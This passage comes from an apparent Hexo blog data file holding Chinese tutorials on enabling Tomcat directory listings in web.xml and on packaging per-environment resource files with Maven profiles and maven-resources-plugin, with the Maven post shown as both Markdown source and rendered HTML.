target=\"_blank\" rel=\"external\">http://xueli.blog.51cto.com/3325186/1585859</a></p>\n","excerpt":"","more":"<p><img src=\"/asserts/images/logo/tomcat.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、进入tomcat目录\"><a href=\"#一、进入tomcat目录\" class=\"headerlink\" title=\"一、进入tomcat目录\"></a>一、进入tomcat目录</h2><blockquote>\n<p>cd /home/yeshaoting/java/server/tomcat/apache-tomcat-6.0.37</p>\n</blockquote>\n<h2 id=\"二、修改web-xml配置\"><a href=\"#二、修改web-xml配置\" class=\"headerlink\" title=\"二、修改web.xml配置\"></a>二、修改web.xml配置</h2><blockquote>\n<p>vim conf/web.xml</p>\n</blockquote>\n<h2 id=\"三、修改listings参数\"><a href=\"#三、修改listings参数\" class=\"headerlink\" title=\"三、修改listings参数\"></a>三、修改listings参数</h2><p>找到名为 <strong>default</strong> 的servlet配置。<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">servlet</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-name</span>&gt;</span>default<span class=\"tag\">&lt;/<span class=\"name\">servlet-name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">servlet-class</span>&gt;</span>org.apache.catalina.servlets.DefaultServlet<span class=\"tag\">&lt;/<span class=\"name\">servlet-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>debug<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>0<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-name</span>&gt;</span>listings<span class=\"tag\">&lt;/<span class=\"name\">param-name</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">param-value</span>&gt;</span>true<span class=\"tag\">&lt;/<span class=\"name\">param-value</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">init-param</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">load-on-startup</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">load-on-startup</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">servlet</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>修改listings参数值为 <strong>true</strong> 。</p>\n<p>listings参数含义说明如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">&lt;!--   listings            Should directory listings be produced if there --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       is no welcome file in this directory?  [false] --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       WARNING: Listings for directories with many    --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       entries can be slow and may consume            --&gt;</span></div><div class=\"line\"><span class=\"comment\">&lt;!--                       significant proportions of server resources.   --&gt;</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><p><a href=\"http://blog.csdn.net/guopengzhang/article/details/5948644\">http://blog.csdn.net/guopengzhang/article/details/5948644</a><br><a href=\"http://xueli.blog.51cto.com/3325186/1585859\">http://xueli.blog.51cto.com/3325186/1585859</a></p>\n"},{"title":"maven不同环境资源文件打包","date":"2016-03-09T07:39:00.000Z","_content":"\n<img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\" />\n\n\n## 一、资源结构\nmaven工程资源结构如下：\n``` bash\nyerba-buena:jvwa yeshaoting$ tree src/main/resources/\nsrc/main/resources/\n├── app-db.properties\n├── app.properties\n├── dev\n│   ├── app-db.properties\n│   └── app.properties\n├── file\n│   ├── image.jpg\n│   └── stage6.jsp\n├── log4j.properties\n├── model\n│   └── UserMapper.xml\n├── prod\n│   ├── app-db.properties\n│   └── app.properties\n├── spring-beans.xml\n├── spring-db.xml\n└── spring-mvc.xml\n\n4 directories, 13 files\n```\n\n\n## 二、需求\n服务部署时，希望针对于不同的环境，使用不同的配置文件。\n针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。\n\n本地环境使用：src/main/resources/ 目录下的这二个文件。\n测试环境使用：src/main/resources/dev 目录下的这二个文件。\n生产环境使用：src/main/resources/prod 目录下的这二个文件。\n\n\n<!-- more -->\n\n\n## 三、解决方案\n借助maven-resources-plugin插件，在pom.xml指定配置。\n打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。\n\n具体配置如下：\n\n### 1. 基本配置\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <build>\n        <plugins>\n          <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-resources-plugin</artifactId>\n            <version>2.6</version>\n            <executions>\n              <execution>\n                <id>copy-resources</id>\n                <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n                <phase>validate</phase>\n                <goals>\n                  <goal>copy-resources</goal>\n                </goals>\n                <configuration>\n                  <!-- 指定resources插件处理资源文件到哪个目录下 -->\n                  <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n                  <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n                  <!-- 待处理的资源定义 -->\n                  <resources>\n                    <resource>\n                      <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                      <directory>src/main/resources/dev</directory>\n                      <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                      <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                      <filtering>false</filtering>\n                    </resource>\n                  </resources>\n                </configuration>\n                <inherited></inherited>\n              </execution>\n            </executions>\n          </plugin>\n        </plugins>\n      </build>\n    </profile>\n</profiles>\n```\n\n### 2. 改进配置\n对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。\n\n我们在profile节点下添加properties属性，使用`deploy.env`来代替不同的环境目录名。于是改进后的配置如下：\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <properties>\n        <deploy.env>dev</deploy.env>\n      </properties>\n    </profile>\n    <profile>\n      <id>prod</id>\n      <properties>\n        <deploy.env>prod</deploy.env>\n      </properties>\n    </profile>\n  </profiles>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-resources-plugin</artifactId>\n        <version>2.6</version>\n        <executions>\n          <execution>\n            <id>copy-resources</id>\n            <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n            <phase>validate</phase>\n            <goals>\n              <goal>copy-resources</goal>\n            </goals>\n            <configuration>\n              <!-- 指定resources插件处理资源文件到哪个目录下 -->\n              <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n              <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n              <!-- 待处理的资源定义 -->\n              <resources>\n                <resource>\n                  <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                  <directory>src/main/resources/${deploy.env}</directory>\n                  <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                  <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样， \n                    这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                  <filtering>false</filtering>\n                </resource>\n              </resources>\n            </configuration>\n            <inherited></inherited>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n```\n\n**注**：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。\n\n\n## 四、参考文档\n[利用maven中resources插件的copy-resources目标进行资源copy和过滤](http://www.tuicool.com/articles/JfaA7r)\n[Copy Resources](http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html)\n[使用maven复制配置文件](http://www.blogjava.net/iduido/archive/2013/03/24/396913.html)\n[Maven 如何为不同的环境打包 —— 开发、测试和产品环境](https://www.zybuluo.com/haokuixi/note/25985)\n[maven copy file文件到指定目录](http://www.tuicool.com/articles/bEbaIz)\n","source":"_posts/article/java/maven不同环境资源文件打包.md","raw":"title: maven不同环境资源文件打包\ntags:\n  - maven\n  - java\ncategories:\n  - 后端开发\ndate: 2016-03-09 15:39:00\n---\n\n<img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\" />\n\n\n## 一、资源结构\nmaven工程资源结构如下：\n``` bash\nyerba-buena:jvwa yeshaoting$ tree src/main/resources/\nsrc/main/resources/\n├── app-db.properties\n├── app.properties\n├── dev\n│   ├── app-db.properties\n│   └── app.properties\n├── file\n│   ├── image.jpg\n│   └── stage6.jsp\n├── log4j.properties\n├── model\n│   └── UserMapper.xml\n├── prod\n│   ├── app-db.properties\n│   └── app.properties\n├── spring-beans.xml\n├── spring-db.xml\n└── spring-mvc.xml\n\n4 directories, 13 files\n```\n\n\n## 二、需求\n服务部署时，希望针对于不同的环境，使用不同的配置文件。\n针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。\n\n本地环境使用：src/main/resources/ 目录下的这二个文件。\n测试环境使用：src/main/resources/dev 目录下的这二个文件。\n生产环境使用：src/main/resources/prod 目录下的这二个文件。\n\n\n<!-- more -->\n\n\n## 三、解决方案\n借助maven-resources-plugin插件，在pom.xml指定配置。\n打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。\n\n具体配置如下：\n\n### 1. 基本配置\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <build>\n        <plugins>\n          <plugin>\n            <groupId>org.apache.maven.plugins</groupId>\n            <artifactId>maven-resources-plugin</artifactId>\n            <version>2.6</version>\n            <executions>\n              <execution>\n                <id>copy-resources</id>\n                <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n                <phase>validate</phase>\n                <goals>\n                  <goal>copy-resources</goal>\n                </goals>\n                <configuration>\n                  <!-- 指定resources插件处理资源文件到哪个目录下 -->\n                  <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n                  <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n                  <!-- 待处理的资源定义 -->\n                  <resources>\n                    <resource>\n                      <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                      <directory>src/main/resources/dev</directory>\n                      <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                      <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                      <filtering>false</filtering>\n                    </resource>\n                  </resources>\n                </configuration>\n                <inherited></inherited>\n              </execution>\n            </executions>\n          </plugin>\n        </plugins>\n      </build>\n    </profile>\n</profiles>\n```\n\n### 2. 改进配置\n对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。\n\n我们在profile节点下添加properties属性，使用`deploy.env`来代替不同的环境目录名。于是改进后的配置如下：\n``` xml\n<profiles>\n    <profile>\n      <id>dev</id>\n      <properties>\n        <deploy.env>dev</deploy.env>\n      </properties>\n    </profile>\n    <profile>\n      <id>prod</id>\n      <properties>\n        <deploy.env>prod</deploy.env>\n      </properties>\n    </profile>\n  </profiles>\n\n  <build>\n    <plugins>\n      <plugin>\n        <groupId>org.apache.maven.plugins</groupId>\n        <artifactId>maven-resources-plugin</artifactId>\n        <version>2.6</version>\n        <executions>\n          <execution>\n            <id>copy-resources</id>\n            <!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 -->\n            <phase>validate</phase>\n            <goals>\n              <goal>copy-resources</goal>\n            </goals>\n            <configuration>\n              <!-- 指定resources插件处理资源文件到哪个目录下 -->\n              <outputDirectory>${project.build.outputDirectory}</outputDirectory>\n              <!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） <outputDirectory>target/classes</outputDirectory> -->\n              <!-- 待处理的资源定义 -->\n              <resources>\n                <resource>\n                  <!-- 指定resources插件处理哪个目录下的资源文件 -->\n                  <directory>src/main/resources/${deploy.env}</directory>\n                  <!-- 指定不需要处理的资源 <excludes> <exclude>WEB-INF/*.*</exclude> </excludes> -->\n                  <!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟<build><resources><resource>下配置的资源过滤是一样的，只不过可能执行的阶段不一样， \n                    这里执行的阶段是插件指定的validate阶段，<build><resources><resource>下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) -->\n                  <filtering>false</filtering>\n                </resource>\n              </resources>\n            </configuration>\n            <inherited></inherited>\n          </execution>\n        </executions>\n      </plugin>\n    </plugins>\n  </build>\n```\n\n**注**：对于资源拷贝问题，网上也用不少通过 maven-antrun-plugin 插件来完成资源拷贝工作，也可以参考。\n\n\n## 四、参考文档\n[利用maven中resources插件的copy-resources目标进行资源copy和过滤](http://www.tuicool.com/articles/JfaA7r)\n[Copy Resources](http://maven.apache.org/plugins/maven-resources-plugin/examples/copy-resources.html)\n[使用maven复制配置文件](http://www.blogjava.net/iduido/archive/2013/03/24/396913.html)\n[Maven 如何为不同的环境打包 —— 开发、测试和产品环境](https://www.zybuluo.com/haokuixi/note/25985)\n[maven copy file文件到指定目录](http://www.tuicool.com/articles/bEbaIz)\n","slug":"article/java/maven不同环境资源文件打包","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxru002z5nbtphv1ci2n","content":"<p><img src=\"/asserts/images/logo/maven.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、资源结构\"><a href=\"#一、资源结构\" class=\"headerlink\" title=\"一、资源结构\"></a>一、资源结构</h2><p>maven工程资源结构如下：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:jvwa yeshaoting$ tree src/main/resources/</div><div class=\"line\">src/main/resources/</div><div class=\"line\">├── app-db.properties</div><div class=\"line\">├── app.properties</div><div class=\"line\">├── dev</div><div class=\"line\">│   ├── app-db.properties</div><div class=\"line\">│   └── app.properties</div><div class=\"line\">├── file</div><div class=\"line\">│   ├── image.jpg</div><div class=\"line\">│   └── stage6.jsp</div><div class=\"line\">├── <span class=\"built_in\">log</span>4j.properties</div><div class=\"line\">├── model</div><div class=\"line\">│   └── UserMapper.xml</div><div class=\"line\">├── prod</div><div class=\"line\">│   ├── app-db.properties</div><div class=\"line\">│   └── app.properties</div><div class=\"line\">├── spring-beans.xml</div><div class=\"line\">├── spring-db.xml</div><div class=\"line\">└── spring-mvc.xml</div><div class=\"line\"></div><div class=\"line\">4 directories, 13 files</div></pre></td></tr></table></figure></p>\n<h2 id=\"二、需求\"><a href=\"#二、需求\" class=\"headerlink\" title=\"二、需求\"></a>二、需求</h2><p>服务部署时，希望针对于不同的环境，使用不同的配置文件。<br>针对于当前工程而言，变化的配置文件为app.properties和app-db.properties。</p>\n<p>本地环境使用：src/main/resources/ 目录下的这二个文件。<br>测试环境使用：src/main/resources/dev 目录下的这二个文件。<br>生产环境使用：src/main/resources/prod 目录下的这二个文件。</p>\n<a id=\"more\"></a>\n<h2 id=\"三、解决方案\"><a href=\"#三、解决方案\" class=\"headerlink\" title=\"三、解决方案\"></a>三、解决方案</h2><p>借助maven-resources-plugin插件，在pom.xml指定配置。<br>打包时，通过 mvn clean package -Pdev 来执行对应的环境资源拷贝工作。</p>\n<p>具体配置如下：</p>\n<h3 id=\"1-基本配置\"><a href=\"#1-基本配置\" class=\"headerlink\" title=\"1. 基本配置\"></a>1. 基本配置</h3><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">                <span class=\"comment\">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">phase</span>&gt;</span>validate<span class=\"tag\">&lt;/<span class=\"name\">phase</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 指定resources插件处理资源文件到哪个目录下 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">outputDirectory</span>&gt;</span>$&#123;project.build.outputDirectory&#125;<span class=\"tag\">&lt;/<span class=\"name\">outputDirectory</span>&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 也可以用下面这样的方式（指定相对url的方式指定outputDirectory） &lt;outputDirectory&gt;target/classes&lt;/outputDirectory&gt; --&gt;</span></div><div class=\"line\">                  <span class=\"comment\">&lt;!-- 待处理的资源定义 --&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 指定resources插件处理哪个目录下的资源文件 --&gt;</span></div><div class=\"line\">                      <span class=\"tag\">&lt;<span class=\"name\">directory</span>&gt;</span>src/main/resources/dev<span class=\"tag\">&lt;/<span class=\"name\">directory</span>&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 指定不需要处理的资源 &lt;excludes&gt; &lt;exclude&gt;WEB-INF/*.*&lt;/exclude&gt; &lt;/excludes&gt; --&gt;</span></div><div class=\"line\">                      <span class=\"comment\">&lt;!-- 是否对待处理的资源开启过滤模式 (resources插件的copy-resources目标也有资源过滤的功能，这里配置的 这个功能的效果跟&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下配置的资源过滤是一样的，只不过可能执行的阶段不一样，这里执行的阶段是插件指定的validate阶段，&lt;build&gt;&lt;resources&gt;&lt;resource&gt;下的配置将是在resources插件的resources目标执行时起作用（在process-resources阶段）) --&gt;</span></div><div class=\"line\">                      <span class=\"tag\">&lt;<span class=\"name\">filtering</span>&gt;</span>false<span class=\"tag\">&lt;/<span class=\"name\">filtering</span>&gt;</span></div><div class=\"line\">                    <span class=\"tag\">&lt;/<span class=\"name\">resource</span>&gt;</span></div><div class=\"line\">                  <span class=\"tag\">&lt;/<span class=\"name\">resources</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">inherited</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">inherited</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;/<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">profiles</span>&gt;</span></div></pre></td></tr></table></figure>\n<h3 id=\"2-改进配置\"><a href=\"#2-改进配置\" class=\"headerlink\" title=\"2. 改进配置\"></a>2. 改进配置</h3><p>对于上面的配置，如果有prod, dev, local三类环境的话，则需要在对应的profile节点下添加三次build的配置。我们可以观察到针对不同的环境只是directory节点内容不同而已，可以使用一个变更代替就好了。</p>\n<p>我们在profile节点下添加properties属性，使用<code>deploy.env</code>来代替不同的环境目录名。于是改进后的配置如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">deploy.env</span>&gt;</span>dev<span class=\"tag\">&lt;/<span class=\"name\">deploy.env</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>prod<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">deploy.env</span>&gt;</span>prod<span class=\"tag\">&lt;/<span class=\"name\">deploy.env</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">properties</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">profile</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">profiles</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">build</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></div><div class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.apache.maven.plugins<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>maven-resources-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></div><div class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">executions</span>&gt;</span></div><div class=\"line\">          <span class=\"tag\">&lt;<span class=\"name\">execution</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">id</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">id</span>&gt;</span></div><div class=\"line\">            <span class=\"comment\">&lt;!-- 在default生命周期的 validate阶段就执行resources插件的copy-resources目标 --&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">phase</span>&gt;</span>validate<span class=\"tag\">&lt;/<span class=\"name\">phase</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">              <span class=\"tag\">&lt;<span class=\"name\">goal</span>&gt;</span>copy-resources<span class=\"tag\">&lt;/<span class=\"name\">goal</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">goals</span>&gt;</span></div><div class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></div><div class=\"line\">              <span 